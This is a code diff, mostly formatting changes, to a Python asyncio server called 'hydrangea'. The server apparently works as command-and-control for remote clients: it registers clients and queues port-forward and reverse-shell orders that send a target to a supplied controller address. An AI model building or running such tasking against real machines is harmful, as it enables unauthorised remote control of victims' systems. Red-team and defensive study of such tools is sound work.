@@ -18,7 +18,9 @@ logging.basicConfig(
 )
 file_handler = logging.FileHandler("hydrangea_server.log")
 file_handler.setLevel(logging.INFO)
-file_handler.setFormatter(logging.Formatter("%(asctime)s %(levelname)s %(name)s: %(message)s"))
+file_handler.setFormatter(
+    logging.Formatter("%(asctime)s %(levelname)s %(name)s: %(message)s")
+)
 logging.getLogger().addHandler(file_handler)
 log = logging.getLogger("hydrangea.server")
 
@@ -41,9 +43,7 @@ class Server:
         self.clients: Dict[str, ClientSession] = {}
         self.servers: list[asyncio.base_events.Server] = []
         self.pending: Dict[str, asyncio.Future] = {}
-        self.log_buffer = logging.handlers.MemoryHandler(
-            capacity=100, target=None
-        )
+        self.log_buffer = logging.handlers.MemoryHandler(capacity=100, target=None)
         logging.getLogger().addHandler(self.log_buffer)
 
     async def start(self):
@@ -105,12 +105,14 @@ class Server:
 
         # Handle test connections separately
         if client_id.startswith("test-connection"):
-            await write_frame(writer, {"type": "REGISTERED", "server_version": __version__})
+            await write_frame(
+                writer, {"type": "REGISTERED", "server_version": __version__}
+            )
             log.info(f"Test connection successful: {client_id}")
             writer.close()
             await writer.wait_closed()
             return
-        
+
         # Replace existing session if duplicate
         if client_id in self.clients:
             try:
@@ -131,7 +133,7 @@ class Server:
                 header, payload = await read_frame(reader)
                 t = header.get("type")
                 if t == "PONG":
-                    continue
+                    print(f"[{client_id}] PONG received, client is alive")
 
                 elif t == "RESULT_LIST_DIR":
                     rid = header.get("req_id")
@@ -205,11 +207,17 @@ class Server:
                 elif t == "REVERSE_SHELL":
                     controller_addr = header.get("controller_addr")
                     if not controller_addr:
-                        response = {"type": "ERROR", "message": "Controller address missing"}
+                        response = {
+                            "type": "ERROR",
+                            "message": "Controller address missing",
+                        }
                         await write_frame(writer, response, b"")
                         continue
 
-                    response = {"type": "REVERSE_SHELL", "controller_addr": controller_addr}
+                    response = {
+                        "type": "REVERSE_SHELL",
+                        "controller_addr": controller_addr,
+                    }
                     await write_frame(writer, response, b"")
 
                 else:
@@ -464,7 +472,8 @@ class Server:
             connect_args = header.get("connect_args")
             if not target or target not in self.clients:
                 await write_frame(writer, {"type": "ERROR", "error": "unknown_target"})
-                writer.close(); await writer.wait_closed()
+                writer.close()
+                await writer.wait_closed()
                 return
             session = self.clients[target]
             order = {
@@ -479,24 +488,39 @@ class Server:
                 writer,
                 {"type": "QUEUED", "order": "port_forward", "filename": filename},
             )
-            writer.close(); await writer.wait_closed()
+            writer.close()
+            await writer.wait_closed()
             return
 
         if action == "reverse_shell":
             controller_addr = header.get("controller_addr")
             if not controller_addr:
-                await write_frame(writer, {"type": "ERROR", "error": "missing_controller_addr"})
-                writer.close(); await writer.wait_closed()
+                await write_frame(
+                    writer, {"type": "ERROR", "error": "missing_controller_addr"}
+                )
+                writer.close()
+                await writer.wait_closed()
                 return
             if not target or target not in self.clients:
                 await write_frame(writer, {"type": "ERROR", "error": "unknown_target"})
-                writer.close(); await writer.wait_closed()
+                writer.close()
+                await writer.wait_closed()
                 return
             session = self.clients[target]
-            order = {"header": {"type": "REVERSE_SHELL", "controller_addr": controller_addr}}
+            order = {
+                "header": {"type": "REVERSE_SHELL", "controller_addr": controller_addr}
+            }
             await session.queue.put(order)
-            await write_frame(writer, {"type": "QUEUED", "order": "reverse_shell", "controller_addr": controller_addr})
-            writer.close(); await writer.wait_closed()
+            await write_frame(
+                writer,
+                {
+                    "type": "QUEUED",
+                    "order": "reverse_shell",
+                    "controller_addr": controller_addr,
+                },
+            )
+            writer.close()
+            await writer.wait_closed()
             return
 
 
